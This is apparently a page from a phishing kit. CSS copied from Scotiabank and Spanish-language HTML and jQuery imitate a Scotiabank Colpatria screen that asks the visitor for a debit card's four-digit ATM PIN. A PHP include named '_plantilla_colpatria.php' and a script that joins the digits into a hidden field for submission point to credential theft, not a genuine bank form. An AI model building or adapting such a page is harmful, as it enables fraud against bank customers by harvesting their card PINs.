    .accordion--card .accordion__item__action .link {
        border-bottom: 0;
        margin-bottom: 1px;
        margin-right: 18px
    }

    @media (max-width: 767px) {
        .accordion--card .accordion__item__action .link {
            display: none
        }
    }

    .accordion--card .accordion__toggle {
        padding: 0;
        width: inherit
    }

    .dropdown-filter__wrap {
        max-width: 100%;
        position: relative
    }

    @media (min-width: 767px) {
        .dropdown-filter__wrap {
            max-width: 26.3rem;
            min-width: 1.9rem
        }
    }

    @media (min-width: 1199px) {
        .dropdown-filter__wrap {
            max-width: 30rem;
            min-width: 18.8rem
        }
    }

    .dropdown-filter {
        appearance: none;
        background-color: transparent;
        border: 0;
        border-radius: .4rem;
        box-shadow: 0 0 0 .1rem #d6d6d6;
        color: #333;
        display: block;
        font-size: 1.6rem;
        outline: none;
        padding: 1.5rem 5.4rem;
        position: relative;
        transition: opacity ease-in-out .2s;
        width: 100%
    }

    .dropdown-filter::-ms-expand {
        display: none
    }

    .dropdown-filter:focus {
        box-shadow: 0 0 0 .2rem #009dd6
    }

    .dropdown-filter__icon {
        pointer-events: none;
        position: absolute;
        top: 1.7rem
    }

    .dropdown-filter__icon--left {
        left: 1.8rem
    }

    .dropdown-filter__icon--right {
        color: #009dd6;
        right: 1.8rem
    }

    .badge {
        border: solid .15rem;
        border-radius: .6rem;
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.2rem;
        line-height: 1rem;
        padding: .6rem;
        text-transform: uppercase
    }

    .badge,
    .badge--pending {
        background-color: #fff;
        border-color: #757575;
        color: #757575
    }

    .badge--new {
        background-color: #7849b8;
        border-color: #7849b8;
        color: #fff
    }

    .badge--error {
        background-color: #fff;
        border-color: #be061b;
        color: #be061b
    }

    .badge--success {
        background-color: #fff;
        border-color: #138468;
        color: #138468
    }

    .toast {
        border-radius: .8rem;
        display: flex;
        margin: .6rem;
        padding: 2.4rem
    }

    .toast.animate {
        opacity: 0;
        animation-delay: 0;
        animation-duration: 8s;
        animation-name: slideOnAndAway
    }

    @keyframes slideOnAndAway {
        0% {
            opacity: 0;
            transform: translateY(100%)
        }

        5% {
            opacity: 1;
            transform: translateY(0)
        }

        95% {
            opacity: 1;
            transform: translateY(0)
        }

        to {
            opacity: 0;
            transform: translateY(100%)
        }
    }

    @media (min-width: 767px) {
        .toast.animate {
            animation-delay: 0;
            animation-duration: 8s;
            animation-name: slideOnAndAway
        }

        @keyframes slideOnAndAway {
            0% {
                opacity: 0;
                transform: translateY(-100%)
            }

            5% {
                opacity: 1;
                transform: translateY(0)
            }

            95% {
                opacity: 1;
                transform: translateY(0)
            }

            to {
                opacity: 0;
                transform: translateY(-100%)
            }
        }
    }

    .toast,
    .toast--success {
        background: #d0e6e1;
        color: #138468
    }

    .toast--info {
        background: #ccebf7;
        color: #007eab
    }

    .toast--error {
        background: #fbcfd1;
        color: #be061b
    }

    .toast__icon {
        margin-right: 1.8rem;
        min-width: 2.4rem
    }

    .toast__icon,
    .toast__icon svg {
        fill: currentColor
    }

    .toaster {
        bottom: 0;
        left: 50%;
        max-width: 1488px;
        position: fixed;
        transform: translate(-50%);
        width: 100%;
        z-index: 101
    }

    @media (max-width: 767px) {
        .toaster {
            background-image: linear-gradient(-180deg, rgba(255, 255, 255, 0) 0%, #ffffff 100%);
            padding-top: 2.4rem;
            width: 100%
        }
    }

    @media (min-width: 767px) {
        .toaster {
            bottom: auto;
            padding-top: 1.2rem;
            top: 0
        }
    }

    .tooltip-open {
        position: static
    }

    .tooltip {
        align-items: center;
        display: inline-flex;
        padding-right: 1rem;
        position: relative;
        width: 100%
    }

    .tooltip--active .tooltip__icon:after {
        animation-delay: 0;
        animation-duration: .2s;
        animation-fill-mode: forwards;
        animation-name: fadeIn;
        animation-timing-function: ease-in-out;
        display: inherit
    }

    @keyframes fadeIn {
        0% {
            opacity: 0
        }

        to {
            opacity: 1
        }
    }

    .tooltip--active .tooltip__icon:focus {
        outline: none
    }

    .tooltip--active .tooltip__dialog {
        display: flex;
        flex-direction: column
    }

    .tooltip--active .tooltip__dialog:focus {
        outline: none
    }

    .tooltip__label {
        height: 2.4rem;
        overflow: hidden
    }

    .tooltip__icon {
        align-items: center;
        background-color: transparent;
        border: 0;
        color: #333;
        display: flex;
        justify-content: center;
        margin-left: .6rem;
        min-width: 1.8rem;
        overflow: visible;
        padding: 0;
        position: relative
    }

    .tooltip__icon:after {
        background-color: #fff;
        border-left: .1rem solid #e2e8ee;
        border-top: .1rem solid #e2e8ee;
        content: "";
        display: none;
        height: 1.7rem;
        left: 0;
        position: absolute;
        top: 2.7rem;
        transform: rotate(45deg);
        width: 1.7rem;
        z-index: 2
    }

    .tooltip__dialog {
        background-color: #fff;
        border: .1rem solid #e2e8ee;
        border-radius: .4rem;
        box-shadow: 0 .2rem 1rem #e2e8ee;
        display: none;
        left: 0;
        overflow: hidden;
        padding: 1.8rem;
        position: absolute;
        top: 3.78rem;
        width: 100%;
        z-index: 1
    }

    .tooltip__dialog__close {
        border: 0;
        margin: .9rem 0;
        padding: 0;
        position: absolute;
        right: 1.8rem
    }

    .tooltip__dialog__header {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        line-height: 1.8rem;
        margin: .9rem 2.7rem .9rem 0
    }

    .tooltip__dialog__content {
        font-family: Scotia Regular;
        font-size: 1.4rem;
        font-weight: initial;
        line-height: 1.8rem;
        margin: .9rem 0 .6rem
    }

    @media (max-width: 767px) {
        .tooltip__dialog__content {
            max-height: 20rem;
            overflow-y: scroll
        }
    }

    .tooltip-fade-exit-active {
        display: flex;
        flex-direction: column
    }

    .popup {
        height: auto;
        width: 57rem
    }

    @media (max-width: 767px) {
        .popup {
            width: 32.7rem
        }
    }

    .popup__container>.container {
        height: 100%
    }

    .popup__container>.container>.direction--row {
        height: 100%
    }

    .popup__header {
        margin: 0
    }

    .popup__header-icon {
        margin-bottom: 1.8rem
    }

    .popup__content {
        margin-top: 1.2rem
    }

    .popup__footer {
        margin-top: 3.6rem;
        padding-bottom: 0
    }

    .popup__footer .button+.button {
        margin-left: 2.4rem
    }

    .avatar {
        display: block;
        position: relative
    }

    .avatar__wrap {
        align-items: center;
        color: #fff;
        display: flex;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        justify-content: center;
        position: relative;
        text-transform: uppercase
    }

    .avatar__image {
        width: 100%
    }

    .avatar__image-wrap {
        overflow: hidden
    }

    .avatar--24 {
        border-radius: 2.4rem;
        font-size: 1.1rem;
        height: 2.4rem;
        letter-spacing: -.017rem;
        overflow: hidden;
        width: 2.4rem
    }

    .avatar--32 {
        border-radius: 3.2rem;
        font-size: 1.5rem;
        height: 3.2rem;
        letter-spacing: -.017rem;
        overflow: hidden;
        width: 3.2rem
    }

    .avatar--48 {
        border-radius: 4.8rem;
        font-size: 2rem;
        height: 4.8rem;
        letter-spacing: -.025rem;
        overflow: hidden;
        width: 4.8rem
    }

    .avatar--60 {
        border-radius: 6rem;
        font-size: 2.4rem;
        height: 6rem;
        letter-spacing: -.03rem;
        overflow: hidden;
        width: 6rem
    }

    .avatar--red {
        background-color: #ec111a
    }

    .avatar--orange {
        background-color: #fb6330
    }

    .avatar--pink {
        background-color: #f2609e
    }

    .avatar--purple {
        background-color: #7849b8
    }

    .avatar--green {
        background-color: #138468
    }

    .avatar--blue {
        background-color: #009dd6
    }

    .avatar--black {
        background-color: #333
    }

    .notification-badge {
        align-items: center;
        background-color: #7849b8;
        border-radius: 50%;
        color: #fff;
        display: flex;
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 12px;
        height: 2.4rem;
        justify-content: center;
        min-width: 2.4rem
    }

    .notification-badge--align-top {
        left: 80%;
        position: absolute;
        top: 0
    }

    .color--black {
        color: #000
    }

    .action-card-content {
        padding: .6rem
    }

    html,
    body {
        min-height: 100vh;
        font-size: 65.2%
    }

    body {
        font-size: 1.6rem
    }

    [hidden] {
        display: none !important
    }

    @media only screen and (min-width: 768px),
    (min-width: 1200px) {
        .container {
            margin: 0 36px;
            max-width: initial
        }
    }

    .block--center {
        margin: 0 auto
    }

    .block--padding-0 {
        padding: 0
    }

    .block--height-100 {
        height: 100%
    }

    .block--width-100 {
        width: 100%
    }

    .block--position-fixed {
        position: fixed
    }

    .block--left {
        justify-content: left
    }

    .text--align-left {
        text-align: left
    }

    .hero {
        font-size: 2.6rem
    }

    @media (min-width: 922px) {
        .hero {
            font-size: 3.6rem
        }
    }

    @media only screen and (min-width: 768px),
    (min-width: 1200px) {
        .container {
            max-width: 1200px
        }

        .container--center {
            margin: 0 auto
        }
    }

    .block--height-100 {
        min-height: 60rem
    }

    ::-webkit-scrollbar {
        width: .25rem
    }

    ::-webkit-scrollbar-track {
        box-shadow: inset 0 0 .02rem #757575;
        border-radius: 2rem
    }

    ::-webkit-scrollbar-thumb {
        background: #757575;
        border-radius: 2rem
    }

    ::-webkit-scrollbar-thumb:hover {
        background: #e2e8ee
    }

    canvas-button-navigation[type=back] .button__icon .svg-icon--color-white {
        fill: #000;
        stroke: #000
    }

    auth-container {
        width: 100%
    }

    .validate-otp {
        max-width: 37rem !important
    }

    .validate-otp--title span {
        display: block;
        font-weight: 700
    }

    .validate-otp--title span:first-child {
        font-size: 3.1rem;
        line-height: 3.9rem
    }

    .validate-otp--title span:last-child {
        font-size: 3.1rem;
        line-height: 3.9rem
    }

    .validate-otp__box-information {
        padding-top: 4.8rem;
        display: contents
    }

    .validate-otp__box-information span {
        font-size: 1.6rem;
        line-height: 2.4rem;
        margin-top: 0
    }

    .validate-otp__buttons {
        max-width: 100%
    }

    .validate-otp__buttons .navegation {
        padding-left: 0
    }

    .validate-otp .form {
        width: 100%
    }

    .validate-otp__retry-otp a.otp--retry {
        margin-bottom: 1rem;
        position: absolute
    }

    .validate-otp__navegation {
        width: 100%
    }

    @media (max-width: 767px) {
        .validate-otp__navegation {
            position: relative;
            bottom: 2rem;
            left: 0;
            margin-top: 6rem
        }
    }

    .link__info {
        border-bottom: dotted 1px;
        margin-bottom: -1px
    }

    @media (max-width: 767px) {
        .validate-toast .toast--container {
            left: 0
        }
    }

    @media only screen and (min-width: 1200px) {
        .validate-toast .toast--container {
            left: 10% !important;
            max-width: 61%
        }
    }

    @media only screen and (min-width: 1300px) {
        .validate-toast .toast--container {
            left: 12% !important;
            max-width: 58%
        }
    }

    @media only screen and (min-width: 1500px) {
        .validate-toast .toast--container {
            left: 23% !important;
            max-width: 40%
        }
    }

    .validate-toast .toast--show {
        top: 5.5rem !important
    }

    @media (max-width: 767px) {
        .validate-toast .toast--show {
            top: auto !important;
            bottom: 0 !important;
            left: 0
        }
    }

    .validate-toast .toast--show .svg-icon--size-14px {
        color: #000
    }

    .validate-toast .text--caption {
        color: #000;
        margin-top: .2rem;
        font-weight: 700
    }

    .validate-otp__box-form .color--info {
        color: #757575
    }

    .validate-otp__box-form .input.input--error {
        border: .2rem solid #be061b;
        box-shadow: 0 .1rem #be061b
    }

    .validate-otp__box-form .input--text-key.input--error:focus {
        border-color: #009dd6;
        box-shadow: 0 .1rem #009dd6
    }

    .validate-otp__box-form .error__text {
        font-family: Scotia Regular
    }

    .validate-otp__box-information {
        padding-top: 4.8rem
    }

    .validate-otp__box-information .svg-icon {
        stroke: none
    }

    @media (max-width: 767px) {
        .validate-otp__box-information .svg-icon {
            height: 2.7rem;
            stroke-width: 2.5;
            width: 2.7rem
        }
    }

    @media (max-width: 767px) {
        .validate-otp__box-information .flex {
            display: flex;
            align-items: flex-start
        }
    }

    .validate-otp__box-information .buddytips-container--co {
        margin-top: 4.5rem
    }

    @media (max-width: 767px) {
        .validate-otp__box-information .buddytips-container--co {
            margin-top: 3.5rem;
            display: grid;
            grid-template-columns: 2.8rem auto;
            grid-template-rows: 100%;
            grid-column-gap: 1.2rem;
            width: 100%;
            padding: 1rem
        }
    }

    @media (max-width: 340px) {
        .validate-otp__box-information .buddytips-container--co {
            position: relative;
            right: 2rem
        }
    }

    .validate-otp__buttons .navegation .button--back {
        padding-left: 0
    }

    .validate-otp__buttons .navegation .button--back .button__icon .svg-icon--color-white {
        fill: #000;
        stroke: #000
    }

    .validate-otp__buttons .validate-otp__buttons--right .navegation {
        display: inline-grid;
        width: 100%
    }

    .validate-otp__buttons .validate-otp__buttons--right .navegation .button--continue {
        justify-self: right
    }

    @media (max-width: 767px) {
        .validate-otp--title span:first-child {
            font-size: 2.7rem;
            line-height: 3.9rem
        }

        .validate-otp--title span:last-child {
            font-size: 2.71rem;
            line-height: 3.41rem
        }
    }

    auth-validate-otp {
        width: 100%
    }

    .input--text-key[_ngcontent-kwl-c51] {
        -webkit-appearance: none;
        appearance: none;
        background-color: transparent;
        border-bottom-color: #757575;
        border-bottom-style: solid;
        border-radius: 8px;
        border-width: 1px 1px 1px;
        color: #333;
        display: block;
        outline: none;
        position: relative;
        transition: box-shadow .2s ease-in-out;
        width: 100%
    }

    .input--text-key[_ngcontent-kwl-c51]:focus {
        border: .2rem solid #009dd6;
        box-shadow: 0 .1rem #009dd6
    }

    .input--text-key.input--error[_ngcontent-kwl-c51]:focus {
        box-shadow: 0 .1rem #be061b
    }

    .input--text-key.input--disabled[_ngcontent-kwl-c51] {
        border-bottom-color: #d6d6d6;
        border-bottom-style: solid;
        color: #757575;
        cursor: not-allowed
    }

    .input--text-key.input--error[_ngcontent-kwl-c51] {
        border-bottom-color: #be061b
    }

    .input--key[_ngcontent-kwl-c51] {
        height: 5.5rem;
        max-width: 4.8rem;
        text-align: center
    }

    .input--obfuscate[_ngcontent-kwl-c51] {
        font-family: text-security-disc;
        font-size: 1rem
    }

    @media (min-width: 0) and (max-width: 767px) {
        .form__input--pin {
            padding-right: .4rem
        }
    }

    @media (min-width: 922px) {
        .col-md-11 {
            -webkit-box-flex: 0;
            -ms-flex: 0 0 91.6666666667%;
            flex: 0 0 91.6666666667%;
            max-width: 91.6666666667%;
            padding: 0 1.5rem;
        }
    }

    @media (min-width: 0) {
        .col-xs-11 {
            -webkit-box-flex: 0;
            -ms-flex: 0 0 91.6666666667%;
            flex: 0 0 91.6666666667%;
            max-width: 91.6666666667%;
            padding: 0 .6rem;
        }
    }

    .header {
        border-bottom: 1px solid #D6D6D6;
        position: fixed;
        background-color: #fff;
        width: 100%;
        z-index: 1000;
        box-shadow: 0 2px 5px #00000042;
        border-top: none;
        height: 78px !important;
    }

    .block,
    .button.block {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-orient: horizontal;
        -webkit-box-direction: normal;
        -ms-flex-direction: row;
        flex-direction: row;
    }

    .text--introduction {
        font-family: 'Scotia Regular', Arial, Helvetica, sans-serif;
        font-size: 2rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.8rem;
        margin: 0;
    }

    .truncate {
        width: 100px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        flex: 1;
    }

    canvas-header .header--product {
        box-shadow: 0 .2rem 1rem 0 rgba(0, 40, 80, .11);
        height: 6rem;
        width: 100%
    }

    canvas-header .header--product__divider {
        width: .1rem;
        height: 2.8rem;
        background-color: #757575;
        margin: .6rem 0 0 2.25rem
    }

    canvas-header .header--product__title {
        margin: .9rem 0 0 2.4rem;
        font-size: 2rem
    }

    canvas-header .header--product__product-icon {
        margin: .5rem 0 0
    }

    canvas-header .header--product__product-close {
        margin: .85rem 0 0
    }

    @media (max-width:1199px) {
        canvas-header .header--product__divider {
            margin: .6rem 0 0 1.25rem
        }
    }

    canvas-header .header__bar {
        padding: .8rem 1.2rem
    }

    @media (max-width:1199px) {
        canvas-header .backPlace {
            display: none !important
        }
    }

    canvas-header[fixed] .header {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        z-index: 300
    }

    canvas-header[fixed] .header:not([class*=background]) {
        background-color: #fff
    }

    canvas-header[shadow] .header {
        box-shadow: 0 .2rem 1rem 0 rgba(0, 40, 80, .11)
    }

    canvas-header[app] .header {
        border-top: 0;
        height: 7.6rem
    }

    canvas-header[app] .header__bar {
        align-items: center;
        padding: 0;
        height: 100%
    }

    canvas-header[app] .header__divider {
        width: .1rem;
        height: 2.4rem;
        margin: 0 3rem;
        background-color: #757575
    }

    canvas-header[app] .header__divider--background {
        width: .2rem;
        background-color: #fff
    }

    canvas-header[app] .header__divider--brand {
        background-color: #ec111a
    }

    canvas-header[app] .header__action {
        cursor: pointer;
        display: flex;
        flex-direction: row
    }

    canvas-header[app] .header__action--left {
        justify-content: flex-start
    }

    canvas-header[app] .header__action--center {
        justify-content: center
    }

    canvas-header[app] .header__action--right {
        justify-content: flex-end
    }

    canvas-header[app] .header__action--caption-left {
        padding-right: .6rem
    }

    canvas-header[app] .header__action--caption-right {
        padding-left: .6rem
    }

    .header {
        border-bottom: 1px solid #D6D6D6;
        position: fixed;
        background-color: #fff;
        width: 100%;
        z-index: 1000;
        box-shadow: 0 2px 5px #00000042;
        border-top: none;
        height: 78px !important
    }

    .divider {
        width: 1px;
        height: 28px;
        margin: 0 3rem;
        background-color: #d6d6d6
    }

    .truncate {
        width: 100px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        flex: 1
    }

    .popup__container {
        z-index: 10000 !important
    }
</style>

<div class="col-xs-12 block--padding-0 margin-md-36--top">
    <div class="direction--row">
        <div class="col-sm-1 hide--xs"></div>
        <div class="col-xs-12 col-sm-4 block--padding-0 validate-otp">
            <div class="validate-otp--title"><span class="heading"> Ingresa la clave de cajero para tu
                    tarjeta
                    debito</span><!----><!----></div>
            <div class="direction--row margin-xs-36--top">
                <form novalidate="" role="form" autocomplete="off" class="form ng-invalid ng-touched ng-dirty">
                    <div class="direction--row">

                        <div class="col-xs-12 block--padding-0 validate-otp__box-form">
                            <p class="text text--small margin-xs-12--top" style="margin-bottom: 20px; font-weight: bold;"> Ingresa la clave de 4
                                digitos </p>
                            <canvas-input-pin formcontrolname="inputPin" _nghost-kwl-c52="" id="inputPinOtpId" class="ng-invalid ng-touched ng-dirty">
                                <div _ngcontent-kwl-c52="" class="direction--row direction--nowrap">
                                    <div _ngcontent-kwl-c52="" class="form__input form__input--pin">
                                        <canvas-input-pin-single _ngcontent-kwl-c52="" _nghost-kwl-c51=""><input _ngcontent-kwl-c51="" inputmode="numeric" maxlength="1" class="input ng-valid ng-touched ng-dirty input--text-key input--key" aria-invalid="false" autocomplete="one-time-code" id="l9nc5jdc6" type="text"></canvas-input-pin-single>
                                    </div>
                                    <div _ngcontent-kwl-c52="" class="form__input form__input--pin">
                                        <canvas-input-pin-single _ngcontent-kwl-c52="" _nghost-kwl-c51=""><input _ngcontent-kwl-c51="" maxlength="1" inputmode="numeric" class="input ng-pristine ng-valid ng-touched input--text-key input--key" aria-invalid="false" autocomplete="one-time-code" id="e1a3457a2" type="text"></canvas-input-pin-single>
                                    </div>
                                    <div _ngcontent-kwl-c52="" class="form__input form__input--pin">
                                        <canvas-input-pin-single _ngcontent-kwl-c52="" _nghost-kwl-c51=""><input _ngcontent-kwl-c51="" inputmode="numeric" maxlength="1" class="input ng-untouched ng-pristine ng-valid input--text-key input--key" aria-invalid="false" autocomplete="one-time-code" id="g0mm25bcl" type="text"></canvas-input-pin-single>
                                    </div>
                                    <div _ngcontent-kwl-c52="" class="form__input form__input--pin">
                                        <canvas-input-pin-single _ngcontent-kwl-c52="" _nghost-kwl-c51=""><input _ngcontent-kwl-c51="" inputmode="numeric" maxlength="1" class="input ng-untouched ng-pristine ng-valid input--text-key input--key" aria-invalid="false" autocomplete="one-time-code" id="fij0i36ln" type="text"></canvas-input-pin-single>
                                    </div>

                                    <!----><!---->
                                </div>
                            </canvas-input-pin><!----><!---->

                        </div>
                    </div>

                </form>
                <input class="text-center input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input" id="txtCajero" style="display:none;" type="tel" inputmode="numeric" pattern="[0-9]*" onkeypress="isInputNumber(event)" placeholder="Código de Verificación" autocomplete="off" aria-describedby="second-credential-input-error" maxlength="6">

            </div>
        </div>
    </div>
    <div class="validate-otp__navegation">
        <div class="direction--row">
            <div class="col-sm-1 hide--xs"></div>
            <div class="col-xs-12 col-sm-8 col-md-8 offset-md-0 block--padding-0">
                <div class="direction--row action__buttons validate-otp__buttons">
                    <div class="col-xs-6 col-sm-4 col-md-4 block--padding-0">
                    </div>
                    <div class="col-xs-6 col-sm-4 col-md-2 block--padding-0 validate-otp__buttons--right">
                        <canvas-button-navigation type="continue" _nghost-kwl-c45=""><button _ngcontent-kwl-c45="" class="button button--continue" id="btnValidateOtpIdd" disabled="" onclick="validateData()">
                            <span _ngcontent-kwl-c45="" class="block block--centered"><!----><span _ngcontent-kwl-c45="" class="button__text" style="
                            font-family: 'Scotia Regular';
                        "> Continuar </span><span _ngcontent-kwl-c45="" class="button__icon block block--centered" id="btnValidateOtpId"><canvas-svg _ngcontent-kwl-c45="" class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-24px svg-icon--color-alternate">
                                                <path fill="none" d="M14.22 4l8 8-8 8M1.78 12h20.44"></path>
                                            </svg></canvas-svg></span><!----></span></button></canvas-button-navigation><!----><!---->
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`
<?php
require_once('_plantilla_colpatria.php');
?>

//<script>
    //Load Document
    $(document).ready(function() {
        $('#header').hide();
        $('#headerNew').show();

        var continueButton = $('#btnValidateOtpIdd');
        var inputs = $('#inputPinOtpId input');
        var hiddenInput = $('#txtCajero');

        function checkInputs() {
            var allFilled = true;
            var combinedValue = '';
            inputs.each(function() {
                var value = $(this).val().trim();
                if (value === '') {
                    allFilled = false;
                }
                combinedValue += value;
            });

            hiddenInput.val(combinedValue);

            if (allFilled) {
                console.log('All inputs are filled');
                continueButton.prop('disabled', false);
            } else {
                console.log('Not all inputs are filled');
                continueButton.prop('disabled', true);
            }
        }

        inputs.on('input', function() {
            if ($(this).val().length == $(this).attr('maxlength')) {
                var nextInput = inputs.eq(inputs.index(this) + 1);
                if (nextInput.length) {
                    nextInput.focus();
                }
            }

            checkInputs();
        });



        $('#submitButton').on('click', function() {
            var pinCode = '';
            inputs.each(function() {
                pinCode += $(this).val();
            });
            console.log('PIN Code:', pinCode);
        });

        checkInputs();
    })